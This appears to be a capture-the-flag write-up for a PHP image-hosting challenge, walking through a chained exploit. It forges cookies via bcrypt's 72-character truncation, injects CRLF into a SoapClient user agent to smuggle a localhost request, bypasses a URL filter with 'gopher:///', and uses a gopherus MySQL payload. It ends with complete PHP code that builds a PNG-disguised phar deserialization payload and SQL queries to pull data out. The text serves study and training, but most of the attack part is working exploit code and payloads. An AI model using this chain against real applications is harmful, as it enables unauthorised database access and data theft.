@@ -1,0 +1,344 @@
+The exploit requires chaining multiple vulnerabilities together in order to make a query to the sql db
+
+
+from the /info page we can see the database user and the db name, no password is used.
+
+the proxy does a curl request with a url we pass it. using the gopher:// protocol we can basically send arbritary data like a telnet terminal, resulting in SSRF.
+when no password is required to access the database, that is enough to log in and make a request. an existing tool called gopherus can create payloads for that.
+
+Getting access to it requires two things: having the user in the cookie set to admin and the `$_SERVER["REMOTE_ADDR"]` variable has to be "127.0.0.1"
+
+
+First the Cookie:
+
+It is constructed of two base64 strings separated by a dot. the first one is some json that holds the files the user has uploaded and the username. the second half is a bcrypt hash of that first half plus an unknown value as a salt, so we can't generate our own.
+
+the cookie is signed and checked with the functions `password_verify(SECRET.$data, $signature)` and `password_hash(SECRET.$json, PASSWORD_BCRYPT)`. those functions only hash the 72 first characters, so anything after that can be edited by us as much as we please. all you have to do is upload a few files to make the cookie too long, then change the username to whatever you want and the signature will come back as valid.
+
+
+next comes the $_SERVER["REMOTE_ADDR"] bypass. unfortunately we can't overwrite that variable with any HTTP headers or anything like that, it gets the IP the request comes from straight from the TCP socket that gets passed to it or something like that, so don't even bother.
+since we can't fake that, we actually have to make a request to the localhost.the only option we have left, is to make the app make a request to itself and trigger the proxy. fortunately, we can find everything we need in the conatiners `Dockerfile`
+
+in it we can see that all these packages get installed:
+
+```
+RUN apk add --no-cache --update php7-fpm php7-phar \
+    php7-fileinfo php7-session php7-soap \
+    php7-mysqli php7-json php-curl
+```
+php7-fpm, php7-fileinfo, php7-session, php7-mysqli, php7-json and php-curl are all being used by the code, so it makes sense that they are there. standing out however are `php7-soap` and `php7-phar`. first we get to phar
+
+
+phar files are PHP archives, holding data in a special format for php that can be read using the `phar://` wrapper. they also hold serialized metadata, so when they get opened and a file gets read, we have an unserialize vulnerability.
+
+When exploiting serialized PHP exploits, you usually look for objects with the functions `__wakeup` and `__destroy`. the first one gets run when you unserialize the object, the second when it gets destroyed. other objects can be used as well depending on how the code you're attacking looks, but those two are the most important ones and the only relevant ones for this challenge.
+you can replace any class valiables that they use and try to redirect code flow that way.
+
+in this whole codebase we only have one such `__destroy` function in `ImageModel.php`
+
+```
+public function __destruct()
+{
+    if (!empty($this->file))
+    {
+        $file_name = $this->file->getFileName();
+        if (is_null($file_name))
+        {
+            $error = 'Something went wrong. Please try again later.';
+            header('Location: /?error=' . urlencode($error));
+            exit;
+        }
+    }
+}
+```
+
+we can see that it tries to read the class variable `$this->file` that we have control over. first it checks if its empty, then tries to call the function `getFileName()` on it.
+
+
+that's where SOAP comes in. with the PHP SOAP libraries, you can specify a SOAP object with some SOAP endpoint at some address you control. you can then use the resulting object to make requests and call functions to that endpoint, which you can specify.
+
+
+```
+$soap = new SoapClient(null, array('location' => "http://localhost:80/proxy", 'uri' => "http://localhost:80/proxy"));
+$soap->getFileName();
+
+
+
+>Listening on any address 80 (http)
+>Connection from 127.0.0.1:37730
+POST /proxy HTTP/1.1
+Host: localhost
+Connection: Keep-Alive
+User-Agent: PHP-SOAP/7.4.5
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "http://localhost:80/proxy#getFileName"
+Content-Length: 396
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost:80/proxy" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getFileName/></SOAP-ENV:Body></SOAP-ENV:Envelope>
+```
+
+even if the SOAP object dosen't have a `getFileName()` function, it will send a HTTP SOAP request to the address you specified with a `getFileName` action.
+
+unfortunately, those requests are a big block of xml and we can't replace it with our own data, so we'll have to find a way around that.
+
+
+fortunately, we can exploit two things here: the feature of HTTP persistent connections and a newline injection in the useragent in the soap client
+
+
+persistent HTTP requests have the header `Connection: keep-alive` to tell the other side, that they don't want to close the connection yet. this allows making multiple HTTP requests by just chaining them together through the same connection to save the overhead of disconnecting and reconnecting again to make the next one.
+
+
+with the newline injection in the useragent, we can craft our own HTTP requests and inject them in the original one. this will result in the following request
+
+```
+$soap = new SoapClient(null, array('location' => "http://localhost:80/proxy",
+'uri'     => "http://localhost:80/info2",
+"user_agent" => "irrelevant\r\n\r\n\r\n\r\n".
+"GET /proxy HTTP/1.1\r\n".
+"Host: admin.imagetok.htb\r\n".
+"Connection: close\r\n"));
+$soap->getFileName();
+
+
+>Listening on any address 80 (http)
+>Connection from 127.0.0.1:37794
+POST /proxy HTTP/1.1
+Host: localhost
+Connection: Keep-Alive
+User-Agent: irrelevant
+
+
+
+GET /proxy HTTP/1.1
+Host: admin.imagetok.htb
+Connection: close
+
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "http://localhost:80/info2#getFileName"
+Content-Length: 396
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost:80/info2" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getFileName/></SOAP-ENV:Body></SOAP-ENV:Envelope>
+```
+
+
+thanks to the multiple newlines after the first request the data we injected gets treated as a reparate HTTP request and since its header states `Connection: close` it will stop the connection at the end of your request instead of dumping all that garbage data into the server (dosen't really matter tho, our request will come back bad anyways. that's just to rule out any eventual bugs this might cause for us)
+
+
+
+with that we are finally able to send a full post request to the server from localhost and bypass both the cookie and the ip check.
+
+
+next come the URL filters.
+
+
+```
+$scheme = parse_url($url, PHP_URL_SCHEME);
+$host   = parse_url($url, PHP_URL_HOST);
+$port   = parse_url($url, PHP_URL_PORT);
+
+if (!empty($scheme) && !preg_match('/^http?$/i', $scheme) || 
+	!empty($host)   && !in_array($host, ['uploads.imagetok.htb', 'admin.imagetok.htb']) ||
+	!empty($port)   && !in_array($port, ['80', '8080', '443']))
+{
+	$router->abort(400);
+} 
+```
+
+looks quite menacing at first, but the bypass is very easy.
+
+
+the address we want to call is `gopher://127.0.0.1:3306/_BLAHBLAHBLAH` with our data at the end. instead of finding a way to trick all those filters, we can break them. adding one more `/` to `gopher://`, making it `gopher:///` breaks the parse_url function and our output just breaks the filter. we get some errors in the console, but it dosen't matter, our code keeps running and curl still interprets `gopher:///` as a valid url scheme.
+
+to generate our payload, we can use a tool called "gopherus"
+it requires a DB user and the query you want to run and generates a payload for you.
+
+```
+> gopherus --exploit mysql
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: username
+Give query to execute: select * from flag;
+
+Your gopher link is ready to do SSRF :
+
+gopher://127.0.0.1:3306/_%a7%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%75%73%65%72%6e%61%6d%65%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%14%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%3b%01%00%00%00%01
+
+-----------Made-by-SpyD3r-----------
+```
+
+that payload needs two modifications: we need to add the third `/` to bypass the filters and we need to urlencode the payload a second time or else curl will complain about nullbytes. 
+
+one last filter we have to bypass is the nginx config. we are only allowed to access `/proxy` if the request comes in for the host `admin.imagetok.htb`, so we need to add that to the request as well
+
+our final payload, including the host header, the modified cookie and the modified gopher url should look something like this
+
+```
+$soap = new SoapClient(null, array('location' => "http://localhost:80/proxy",
+												"uri"      => "http://localhost:80/proxy",
+												"user_agent" => "irrelevant\r\n\r\n\r\n\r\n".
+												"POST /proxy HTTP/1.1\r\n".
+												"Host: admin.imagetok.htb\r\n".
+												"Connection: close\r\n".
+												"Cookie: PHPSESSID=eyJkaWRuJ3QgeW91ciBtYW1hIGV2ZXIgdGVhY2ggeW91IHRoYXQgaXQncyBydWRlIHRvIHNub29wIGluIG90aGVyIHBlb3BsZXMgY29va2llcz8ifQ==.JDJ5JDEwJGlpMlFtSHh3UGdldGcvQlpxSlkySk82aGt3LjVvOGFRMDZQbHkxT1hRLnJBNUp5YW9rRUpL;\r\n".
+												"Content-Type: application/x-www-form-urlencoded\r\n".
+												"Content-Length: 1520\r\n\r\n".
+												"url=gopher:///127.0.0.1:3306/_%25a7%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2575%2573%2565%2572%256e%2561%256d%2565%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2514%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2566%256c%2561%2567%253b%2501%2500%2500%2500%2501".
+												"\r\n\r\n\r\n"));
+```
+
+with all of the filters bypassed and our payload ready, it's time to actually assemble the phar file and find a way to trigger the unserializing.
+
+
+since we need our soap object inside the ImageModel class, we first define that
+
+```
+
+class ImageModel{
+	public $file;
+	public function __construct($file)
+		{
+		$this->file = new SoapClient(null, array('location' => "http://localhost:80/proxy",
+												'uri'      => "http://localhost:80/proxy",
+												"user_agent" => "irrelevant\r\n\r\n\r\n\r\n".
+												"POST /proxy HTTP/1.1\r\n".
+												"Host: admin.imagetok.htb\r\n".
+												"Connection: close\r\n".
+												"Cookie: PHPSESSID=eyJkaWRuJ3QgeW91ciBtYW1hIGV2ZXIgdGVhY2ggeW91IHRoYXQgaXQncyBydWRlIHRvIHNub29wIGluIG90aGVyIHBlb3BsZXMgY29va2llcz8ifQ==.JDJ5JDEwJGlpMlFtSHh3UGdldGcvQlpxSlkySk82aGt3LjVvOGFRMDZQbHkxT1hRLnJBNUp5YW9rRUpL;\r\n".
+												"Content-Type: application/x-www-form-urlencoded\r\n".
+												"Content-Length: 1520\r\n\r\n".
+												"url=gopher:///127.0.0.1:3306/_%25a7%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2575%2573%2565%2572%256e%2561%256d%2565%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2514%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2566%256c%2561%2567%253b%2501%2500%2500%2500%2501".
+												"\r\n\r\n\r\n"));
+	}
+} 
+
+$client = new ImageModel("1337");
+
+```
+
+now that we have a client object, we need to create a phar file and add the object as metadata.
+
+```
+
+$phar = new Phar("payload.phar");
+$phar->startBuffering();
+
+
+$phar->setMetadata($client);
+$phar->stopBuffering();
+
+```
+
+this will create a file for us, that when read, should trigger our object and call the `__destruct` function on it.
+
+but how do we actually trigger it?
+
+our friend here is the `/image/` route. everything that comes after it is being treated as a filename and gets run through multiple functions that require reading it, but it also needs to pass checks like file_exists.
+gladly, the `phar://` wrapper supports that, since it's an archive with files in it. all we need to do is add another file to the archive and we pass that test. and as a nice side effect: our payload gets triggered since it had to read and parse the file for that!
+
+so by accessing a path like `/image/phar:%2f%2farchive.phar/file.txt` we can read its contents. except we can't, because of the problem we run into in the next step
+
+the `/` in our phar path need to be urlencoded, otherwise the server will think it's part of the path and look for a file that dosen't exist
+
+how do we get our phar archive onto the server? obviously, the answer is the image upload on the frontpage. unfortunately, all uploaded and accessed files are checked for being real files here in `ImageModel.php` here
+
+
+```
+  if (mime_content_type($file_name) != 'image/png') 
+            return false;
+
+        $size = getimagesize($file_name);
+        var_dump($size);
+        if (!$size || !($size[0] >= 120 && $size[1] >= 120) || $size[2] !== IMAGETYPE_PNG)
+            return false;
+```
+
+so our file needs to not just return a png mime type, it even has to read as a proper image with a certain size
+
+fortunately, phar files have a stub at the beginning with any size you want, so you can just slap a full png image in front of your payload and you'll be fine. and the file you add to the phar can also just be a png, that way an image file will actually be loaded and if everything was successful you should see it on the page
+
+after all that, our php file to generate the phar should look something like this
+
+```
+<?
+
+//create object to exploit
+class ImageModel{
+	public $file;
+	public function __construct($file)
+		{
+		//modified soap client with injected http request
+		$this->file = new SoapClient(null, array('location' => "http://localhost:80/proxy",
+												'uri'      => "http://localhost:80/proxy",
+												"user_agent" => "irrelevant\r\n\r\n\r\n\r\n".
+												"POST /proxy HTTP/1.1\r\n".
+												"Host: admin.imagetok.htb\r\n".
+												"Connection: close\r\n".
+												"Cookie: PHPSESSID=eyJkaWRuJ3QgeW91ciBtYW1hIGV2ZXIgdGVhY2ggeW91IHRoYXQgaXQncyBydWRlIHRvIHNub29wIGluIG90aGVyIHBlb3BsZXMgY29va2llcz8iOiJ3cml0ZXVwIGJ5IHozdXouIGlmIHlvdSBnb3QgaXQgZnJvbSBhbnlvbmUgZWxzZSBhbmQgcGFpZCBmb3IgaXQgdGhleSBhIGZ1Y2tpbicgYml0Y2gifQ%3D%3D.JDJ5JDEwJGlpMlFtSHh3UGdldGcvQlpxSlkySk82aGt3LjVvOGFRMDZQbHkxT1hRLnJBNUp5YW9rRUpL;\r\n".
+												"Content-Type: application/x-www-form-urlencoded\r\n".
+												"Content-Length: 1520\r\n\r\n".
+												"url=gopher:///127.0.0.1:3306/_%25a7%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2575%2573%2565%2572%256e%2561%256d%2565%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2514%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2566%256c%2561%2567%253b%2501%2500%2500%2500%2501".
+												"\r\n\r\n\r\n"));
+	}
+} 
+
+//our object to add to the phar file
+$client = new ImageModel("1337");
+
+
+/creating our phar
+$phar = new Phar("payload.phar");
+$phar->startBuffering();
+
+//adding our image
+$phar->addFile('image.png','image.png');
+
+//setting the phar stub to the image
+$phar->setStub(file_get_contents("image.png")." __HALT_COMPILER(); ?>");
+
+//adding our object as metadata
+$phar->setMetadata($client);
+
+/ending the phar file
+$phar->stopBuffering();
+?>
+```
+
+
+running this should output a payload.phar file that we can rename to a png file, upload and then query like this
+
+`/image/phar:%2f%2fuploadfilename.png%2fimage.png`
+
+that should trigger our object, send the soap request with our payload, trigger curl and send our query to the database.
+
+except we can't see the result of the query, so how do we get the output? by putting it in another table!
+
+with every singe request we make, the cookie gets updated with all the files the user has uploaded. since we can can change our username, we can specify which data we want to read, so we can do a query like this
+
+`INSERT INTO $DBNAME.files(file_name, checksum, username) SELECT $DATA,0,"$USERNAME" from $TABLE [where X=X or something idk];`
+
+$DBNAME needs to be the databases name, the second half is basically a normal select query, all that matters is that you return 3 separate things so they can be inserted into the table
+you can also set your username to whatever you want to since the cookie only contains 5 returned values and you might want to come back to them again later
+
+with all that we can start reading what databases exist, extract their tables, their columns and then read the flag from the column `flag` of the table `definitely_not_a_flag` with this query
+
+`INSERT INTO $DBNAME.files(file_name, checksum, username) SELECT flag,0,"flag" from $DBNAME.definitely_not_a_flag;`
+
+replace $DBNAME with the name of the DB in your challenge, and put your payload together.
+change your cookie to the user "flag", make a request, decode the new cookie and you should be left with your flag:
+
+
+
+Z3uz
